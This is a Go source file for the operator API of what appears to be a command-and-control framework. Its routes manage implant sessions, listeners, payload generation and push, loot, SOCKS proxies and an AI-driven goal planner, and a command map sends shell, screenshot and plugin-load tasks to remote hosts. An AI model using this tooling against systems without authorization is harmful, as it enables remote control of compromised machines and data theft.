package api

import (
	"encoding/json"
	"net/http"
	"strings"

	"wispp/protocol"
	"wispp/server/internal/ai"
	"wispp/server/internal/core"
	"wispp/server/internal/db"
	"wispp/server/internal/filesvc"
	"wispp/server/internal/fserver"
	"wispp/server/internal/fwd"
	"wispp/server/internal/guard"
	"wispp/server/internal/listener"
	"wispp/server/internal/orchestration"
	"wispp/server/internal/payload"
	"wispp/server/internal/pluginstore"
	"wispp/server/internal/rcp"
	"wispp/server/internal/report"
	"wispp/server/internal/socks"
)

// DebugAPI is the operator surface (M1): token-authed JSON + SSE event stream,
// project-scoped. Full WebSocket console transport lands with M3 (RCP relay).
type DebugAPI struct {
	Hub      *core.Hub
	Store    *db.Store
	RCP      *rcp.Hub
	Files    *filesvc.Service
	Payloads *payload.Service
	AI       *ai.Runtime
	Manager  *listener.Manager
	Plugins  *pluginstore.Store
	Reports  *report.Gen
	Goals    *orchestration.Engine
	Forwards *fwd.Svc
	Socks    *socks.Svc
	FServer  *fserver.Svc
	Token    string // load-once; "" disables auth (dev only)
}

func (a *DebugAPI) Handler() http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/projects", a.projects)
	mux.HandleFunc("POST /api/projects", a.projectCreate)
	mux.HandleFunc("PATCH /api/projects/{id}", a.projectUpdate)
	mux.HandleFunc("GET /api/metrics", a.metrics)
	mux.HandleFunc("GET /api/sessions", a.sessions)
	mux.HandleFunc("POST /api/sessions/{id}/tasks", a.createTask)
	mux.HandleFunc("DELETE /api/sessions/{id}", a.deleteSession)
	mux.HandleFunc("PATCH /api/sessions/{id}/meta", a.sessionMeta)
	mux.HandleFunc("GET /api/loots", a.loots)
	mux.HandleFunc("POST /api/transfer", a.transfer)
	mux.HandleFunc("GET /api/tasks", a.tasks)
	mux.HandleFunc("GET /api/logs", a.logs)
	mux.HandleFunc("GET /api/history", a.history)
	mux.HandleFunc("GET /api/rcp/{id}/status", a.RCPStatus)
	mux.HandleFunc("POST /api/rcp/{id}/connect", a.RCPConnect)
	mux.HandleFunc("POST /api/rcp/{id}/disconnect", a.RCPDisconnect)
	mux.HandleFunc("POST /api/p2p/{id}/bridge", a.p2pBridge)
	mux.HandleFunc("POST /api/p2p/{id}/stop", a.p2pStop)
	mux.HandleFunc("GET /api/files", a.fileJobs)
	mux.HandleFunc("POST /api/sessions/{id}/files", a.createFileJob)
	mux.HandleFunc("POST /api/files/{job}/retry", a.retryFileJob)
	mux.HandleFunc("GET /api/files/{job}/download", a.fileDownload)
	mux.HandleFunc("POST /api/files/upload", a.fileUpload)
	mux.HandleFunc("GET /api/net/ips", a.netIPs)
	mux.HandleFunc("GET /api/listeners", a.listenersList)
	mux.HandleFunc("POST /api/listeners", a.listenerCreate)
	mux.HandleFunc("PATCH /api/listeners/{id}", a.listenerUpdate)
	mux.HandleFunc("POST /api/listeners/{id}/cert", a.listenerCertSet)
	mux.HandleFunc("DELETE /api/listeners/{id}/cert", a.listenerCertClear)
	mux.HandleFunc("POST /api/listeners/{id}/stop", a.listenerStop)
	mux.HandleFunc("POST /api/listeners/{id}/start", a.listenerStart)
	mux.HandleFunc("DELETE /api/listeners/{id}", a.listenerDelete)
	mux.HandleFunc("GET /api/profiles", a.profilesList)
	mux.HandleFunc("PUT /api/profiles", a.profilePut)
	mux.HandleFunc("DELETE /api/profiles/{name}", a.profileDelete)
	mux.HandleFunc("POST /api/profiles/validate", a.profileValidate)
	mux.HandleFunc("POST /api/profiles/import", a.profileImport)
	mux.HandleFunc("GET /api/plugins", a.pluginsList)
	mux.HandleFunc("POST /api/plugins", a.pluginInstall)
	mux.HandleFunc("POST /api/plugins/{id}/enable", a.pluginEnable)
	mux.HandleFunc("DELETE /api/plugins/{id}", a.pluginDelete)
	mux.HandleFunc("POST /api/plugins/{id}/deploy", a.pluginDeploy)
	mux.HandleFunc("POST /api/plugins/{id}/exec", a.pluginExec)
	mux.HandleFunc("GET /api/plugins/calls", a.pluginCalls)
	mux.HandleFunc("GET /api/reports", a.reportsList)
	mux.HandleFunc("POST /api/reports", a.reportCreate)
	mux.HandleFunc("GET /api/reports/{id}", a.reportGet)
	mux.HandleFunc("DELETE /api/reports/{id}", a.reportDelete)
	mux.HandleFunc("GET /api/goals", a.goalsList)
	mux.HandleFunc("GET /api/goals/{id}", a.goalGet)
	mux.HandleFunc("POST /api/goals", a.goalCreate)
	mux.HandleFunc("POST /api/goals/plan", a.goalPlan)
	mux.HandleFunc("POST /api/goals/{id}/start", a.goalStart)
	mux.HandleFunc("POST /api/goals/{id}/pause", a.goalPause)
	mux.HandleFunc("DELETE /api/goals/{id}", a.goalDelete)
	mux.HandleFunc("POST /api/goals/{id}/steps", a.stepAdd)
	mux.HandleFunc("POST /api/steps/{id}/decide", a.stepDecide)
	mux.HandleFunc("PATCH /api/steps/{id}", a.stepPatch)
	mux.HandleFunc("DELETE /api/steps/{id}", a.stepDelete)
	mux.HandleFunc("GET /api/forwards", a.fwdList)
	mux.HandleFunc("POST /api/forwards", a.fwdCreate)
	mux.HandleFunc("DELETE /api/forwards/{id}", a.fwdStop)
	mux.HandleFunc("GET /api/socks", a.socksList)
	mux.HandleFunc("POST /api/socks", a.socksCreate)
	mux.HandleFunc("DELETE /api/socks/{id}", a.socksStop)
	mux.HandleFunc("GET /api/fileserver", a.fserverGet)
	mux.HandleFunc("PUT /api/fileserver", a.fserverPut)
	mux.HandleFunc("POST /api/fileserver/cert", a.fserverCert)
	mux.HandleFunc("GET /api/deliveries", a.deliveriesList)
	mux.HandleFunc("POST /api/deliveries", a.deliveryCreate)
	mux.HandleFunc("PATCH /api/deliveries/{id}", a.deliveryPatch)
	mux.HandleFunc("DELETE /api/deliveries/{id}", a.deliveryDelete)
	mux.HandleFunc("GET /api/shares", a.sharesList)
	mux.HandleFunc("GET /api/shares/files", a.shareFiles)
	mux.HandleFunc("POST /api/shares", a.shareCreate)
	mux.HandleFunc("PATCH /api/shares/{id}", a.sharePatch)
	mux.HandleFunc("DELETE /api/shares/{id}", a.shareDelete)
	mux.HandleFunc("GET /api/payloads/platforms", a.payloadPlatforms)
	mux.HandleFunc("GET /api/payloads/capabilities", a.payloadCapabilities)
	mux.HandleFunc("GET /api/ai/status", a.aiStatus)
	mux.HandleFunc("GET /api/config/ai", a.cfgAIGet)
	mux.HandleFunc("PUT /api/config/ai", a.cfgAIPut)
	mux.HandleFunc("POST /api/config/ai/test", a.cfgAITest)
	mux.HandleFunc("POST /api/config/ai/active", a.cfgAIActive)
	mux.HandleFunc("GET /api/config/ai/models", a.cfgAIModels)
	mux.HandleFunc("GET /api/ai/history", a.aiHistory)
	mux.HandleFunc("GET /api/ai/conversations", a.aiConversations)
	mux.HandleFunc("POST /api/ai/conversations/{id}/rename", a.aiRename)
	mux.HandleFunc("DELETE /api/ai/conversations/{id}", a.aiDelete)
	mux.HandleFunc("POST /api/ai/chat", a.aiChat)
	mux.HandleFunc("GET /api/ai/approvals", a.aiApprovals)
	mux.HandleFunc("POST /api/ai/approvals/{id}/decide", a.aiDecide)
	mux.HandleFunc("GET /api/payloads", a.payloadsList)
	mux.HandleFunc("POST /api/payloads", a.payloadCreate)
	mux.HandleFunc("GET /api/payloads/{id}/download", a.payloadDownload)
	mux.HandleFunc("DELETE /api/payloads/{id}", a.payloadDelete)
	mux.HandleFunc("POST /api/payloads/{id}/push", a.payloadPush)
	mux.HandleFunc("POST /api/payloads/{id}/rearm", a.payloadRearm)
	mux.HandleFunc("GET /api/payloads/templates", a.payloadTemplates)
	mux.HandleFunc("GET /api/rcp/{id}/channel", a.RCPChannel)
	mux.HandleFunc("GET /api/events", a.events)
	return a.auth(mux)
}

func (a *DebugAPI) auth(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if a.Token != "" {
			tok := r.Header.Get("X-Wisp-Token")
			if tok == "" {
				tok = r.URL.Query().Get("token") // SSE via EventSource cannot set headers
			}
			if !guard.CheckToken(tok, a.Token) {
				writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "unauthorized"})
				return
			}
		}
		next.ServeHTTP(w, r)
	})
}

func writeJSON(w http.ResponseWriter, code int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	_ = json.NewEncoder(w).Encode(v)
}

// projectOf resolves a session's project for file jobs and audit events.
func (a *DebugAPI) projectOf(session string) string {
	if p := a.Hub.Project(session); p != "" {
		return p
	}
	return "default"
}

func (a *DebugAPI) projects(w http.ResponseWriter, _ *http.Request) {
	type proj struct {
		ID, Name, Color string
	}
	seen := map[string]bool{}
	out := []proj{}
	add := func(id, name, color string) {
		if id == "" || seen[id] {
			return
		}
		seen[id] = true
		if name == "" {
			name = id
		}
		if color == "" {
			color = "#8B93A7"
		}
		out = append(out, proj{id, name, color})
	}
	if a.Store != nil {
		if rows, err := a.Store.Projects(); err == nil {
			for _, r := range rows {
				add(r[0], r[1], r[2])
			}
		}
	}
	if a.Manager != nil {
		for _, l := range a.Manager.List() {
			add(l.Project, l.Project, "#8B93A7")
		}
	}
	if a.Hub != nil {
		for _, s := range a.Hub.Sessions("") {
			add(s.Project, s.Project, "#8B93A7")
		}
	}
	if len(out) == 0 {
		add("default", "Default", "#2F81F7")
	}
	writeJSON(w, http.StatusOK, out)
}

type sessionOut struct {
	core.SessionView
	Tags  []string `json:"tags"`
	Notes string   `json:"notes"`
	Color string   `json:"color"`
}

func (a *DebugAPI) sessions(w http.ResponseWriter, r *http.Request) {
	views := a.Hub.Sessions(r.URL.Query().Get("project"))
	metas, _ := a.Store.MetaAll()
	out := make([]sessionOut, 0, len(views))
	for _, v := range views {
		o := sessionOut{SessionView: v, Tags: []string{}}
		if m := metas[v.ID]; m != nil {
			o.Tags, o.Notes, o.Color = m.Tags, m.Notes, m.Color
			if o.Tags == nil {
				o.Tags = []string{}
			}
		}
		out = append(out, o)
	}
	writeJSON(w, http.StatusOK, out)
}

type createTaskReq struct {
	Cmd  string          `json:"cmd"`
	Args json.RawMessage `json:"args,omitempty"`
}

var cmdByName = map[string]uint32{
	"shell":       protocol.CmdShell,
	"rcp":         protocol.CmdRCPConnect,
	"rcpdrop":     protocol.CmdRCPDisconnect,
	"pwd":         protocol.CmdPwd,
	"ls":          protocol.CmdLsJSON,
	"mkdir":       protocol.CmdMkdir,
	"rm":          protocol.CmdRm,
	"sysinfo":     protocol.CmdSysinfo,
	"screenshot":  protocol.CmdScreenshot,
	"ps":          protocol.CmdPs,
	"sleep":       protocol.CmdSleep,
	"exit":        protocol.CmdExit,
	"kill":        protocol.CmdClientKill,
	"rekey":       protocol.CmdRekey,
	"plugin_load": protocol.CmdPluginLoad,
}

func (a *DebugAPI) deleteSession(w http.ResponseWriter, r *http.Request) {
	ok := a.Hub.Remove(r.PathValue("id"))
	writeJSON(w, mapToCode(ok), map[string]bool{"deleted": ok})
}

func mapToCode(ok bool) int {
	if ok {
		return http.StatusOK
	}
	return http.StatusNotFound
}

func (a *DebugAPI) createTask(w http.ResponseWriter, r *http.Request) {
	var req createTaskReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
		return
	}
	cmd, ok := cmdByName[strings.ToLower(req.Cmd)]
	if !ok {
		writeJSON(w, http.StatusBadRequest, map[string]any{"error": "unknown cmd", "known": keys(cmdByName)})
		return
	}
	if req.Args != nil && !json.Valid(req.Args) {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "args not valid JSON"})
		return
	}
	rec, err := a.Hub.Enqueue(r.PathValue("id"), cmd, req.Args)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusAccepted, rec)
}

func (a *DebugAPI) tasks(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, a.Hub.Tasks(r.URL.Query().Get("session"), r.URL.Query().Get("project")))
}

func (a *DebugAPI) logs(w http.ResponseWriter, r *http.Request) {
	evs := a.Hub.Events()
	if pid := r.URL.Query().Get("project"); pid != "" {
		out := evs[:0]
		for _, e := range evs {
			if e.Project == pid {
				out = append(out, e)
			}
		}
		evs = out
	}
	writeJSON(w, http.StatusOK, evs)
}

// history returns persisted session rows (survives restarts).
func (a *DebugAPI) history(w http.ResponseWriter, r *http.Request) {
	if a.Store == nil {
		writeJSON(w, http.StatusOK, []any{})
		return
	}
	rows, err := a.Store.Sessions(r.URL.Query().Get("project"))
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, rows)
}

// events streams every hub event as Server-Sent Events until the client
// disconnects. M3 upgrades transport to WebSocket for the RCP frame relay.
func (a *DebugAPI) events(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "streaming unsupported"})
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	ch := a.Hub.Subscribe(64)
	defer a.Hub.Unsubscribe(ch)
	flusher.Flush()
	for {
		select {
		case <-r.Context().Done():
			return
		case ev := <-ch:
			if pid := r.URL.Query().Get("project"); pid != "" && ev.Project != "" && ev.Project != pid {
				continue
			}
			b, _ := json.Marshal(ev)
			_, _ = w.Write([]byte("data: "))
			_, _ = w.Write(b)
			_, _ = w.Write([]byte("\n\n"))
			flusher.Flush()
		}
	}
}

func keys(m map[string]uint32) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}
